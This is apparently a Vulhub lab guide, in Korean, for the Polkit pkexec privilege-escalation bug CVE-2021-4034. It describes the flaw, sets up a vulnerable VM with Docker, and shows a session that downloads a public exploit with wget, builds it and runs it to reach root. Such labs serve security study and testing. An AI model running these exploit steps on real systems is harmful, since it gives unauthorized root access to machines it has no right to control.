# Polkit `pkexec` 로컬 권한 상승 취약점 (CVE-2021-4034)


Polkit(이전 명칭: PolicyKit)은 유닉스 계열 운영체제에서 시스템 전체 권한을 제어하기 위한 컴포넌트입니다. `pkexec` 애플리케이션은 Polkit에서 제공하는 setuid 도구로, 사전에 정의된 정책에 따라 비특권 사용자가 명령어를 특권 사용자 권한으로 실행할 수 있도록 설계되었습니다.

현재 버전의 `pkexec`는 호출 시 전달된 인자 수를 올바르게 처리하지 못하여, 환경 변수를 명령어로 실행하려고 시도합니다. 공격자는 환경 변수를 조작하여 `pkexec`가 임의 코드를 실행하도록 유도할 수 있습니다. 공격이 성공하면 비특권 사용자가 대상 시스템에서 관리자 권한을 얻을 수 있습니다.

참고자료:

- https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
- https://blog.qualys.com/vulnerabilities-threat-research/2022/01/25/pwnkit-local-privilege-escalation-vulnerability-discovered-in-polkits-pkexec-cve-2021-4034
- https://github.com/berdav/CVE-2021-4034

## 취약점 환경 구축

> 참고: 리눅스 커널은 [`argc==0` 버그](https://lwn.net/Articles/882799/)를 [이 커밋](https://github.com/torvalds/linux/commit/dcd46d897adb70d63e025f175a00a89797d31a43)에서 수정했습니다. 따라서 Vulhub에서는 QEMU 가상 머신 에뮬레이터를 사용하여 취약한 Ubuntu 20.04(Polkit 0.105 버전 포함)를 실행합니다. 환경 구동을 위해 시스템에 최소 2GB 메모리가 필요합니다.

다음 명령어로 Polkit 0.105가 설치된 Ubuntu 20.04를 실행할 수 있습니다:

```bash
docker compose up -d
```

Docker 컨테이너 내부에서 가상 서버가 실행되기 때문에, `docker compose logs -f` 명령어로 아래와 같은 성공 로그가 출력될 때까지 다소 시간이 걸릴 수 있습니다:

```
cmd_1  | [  651.040963] cloud-init[1627]: Cloud-init v. 20.1-10-g71af48df-0ubuntu5 running 'modules:final' at Wed, 11 Jan 2023 14:57:10 +0000. Up 209.05 seconds.
cmd_1  | [  651.046024] cloud-init[1627]: ci-info: no authorized SSH keys fingerprints found for user ubuntu.
cmd_1  | [  651.049934] cloud-init[1627]: Cloud-init v. 20.1-10-g71af48df-0ubuntu5 finished at Wed, 11 Jan 2023 15:04:32 +0000. Datasource DataSourceNoCloud [seed=/dev/sdb][dsmode=net].  Up 650.90 seconds
cmd_1  | [  OK  ] Finished Execute cloud user/final scripts.
cmd_1  | [  OK  ] Reached target Cloud-init target.
```

![](https://github.com/vulhub/vulhub/raw/master/polkit/CVE-2021-4034/1.png)

## 익스플로잇 수행 방법

먼저, 대상 SSH 서버에 `ubuntu/vulhub` 계정으로 로그인합니다:

```bash
ssh ubuntu@192.168.1.163 -p2222
```

그리고 [이 저장소](https://github.com/berdav/CVE-2021-4034)를 이용하여 CVE-2021-4034를 재현합니다:

```bash
ubuntu@ubuntu:~$ id
uid=1000(ubuntu) gid=1000(ubuntu) groups=1000(ubuntu),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),117(netdev),118(lxd)
ubuntu@ubuntu:~$ cd /tmp/
ubuntu@ubuntu:/tmp$ wget https://github.com/berdav/CVE-2021-4034/archive/refs/heads/main.tar.gz
ubuntu@ubuntu:/tmp$ tar -zxvf main.tar.gz
ubuntu@ubuntu:/tmp$ cd CVE-2021-4034-main/
ubuntu@ubuntu:/tmp/CVE-2021-4034-main$ make
ubuntu@ubuntu:/tmp/CVE-2021-4034-main$ ./cve-2021-4034
# id
uid=0(root) gid=0(root) groups=0(root),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),117(netdev),118(lxd),1000(ubuntu)
```

![](https://github.com/vulhub/vulhub/raw/master/polkit/CVE-2021-4034/2.png)

익스플로잇 수행 후 루트 사용자 권한을 획득했음을 확인할 수 있습니다.

